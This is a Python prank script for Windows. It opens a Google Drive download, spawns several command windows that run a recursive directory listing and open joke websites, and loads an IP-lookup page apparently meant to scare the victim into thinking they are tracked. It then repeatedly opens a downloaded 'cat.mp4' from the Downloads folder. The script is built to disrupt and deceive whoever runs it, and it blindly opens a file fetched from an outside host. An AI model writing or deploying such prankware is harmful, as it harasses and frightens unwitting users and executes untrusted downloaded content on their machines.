import subprocess
import os
import time
import webbrowser


def open_cmds_with_commands(commands):
    for command in commands:
        subprocess.Popen(['start', 'cmd', '/c', command], shell=True)
        time.sleep(0.1)  # Short delay to ensure windows open correctly


if __name__ == "__main__":
    url = 'https://drive.usercontent.google.com/download?id=1QIydeG52ujsi2ZHvx1LS_EP5Zbr-ByIZ&export=download&authuser=0'
    webbrowser.open(url)
    commands_to_run = [
        "dir/s",
        "explorer https://floatingqrcode.com",
        "explorer https://thatsthefinger.com",
        "explorer https://omfgdogs.com",
        "explorer https://whatismyipaddress.com/ip/217.170.205.14",
    ]

    open_cmds_with_commands(commands_to_run)

for _ in range(5):
    downloads_folder = os.path.join(os.environ['USERPROFILE'], 'Downloads')
    file_name = 'cat.mp4'
    file_path = os.path.join(downloads_folder, file_name)

    time.sleep(2)

    file_open_command = f'start "" "{file_path}"'
    subprocess.Popen(file_open_command, shell=True)
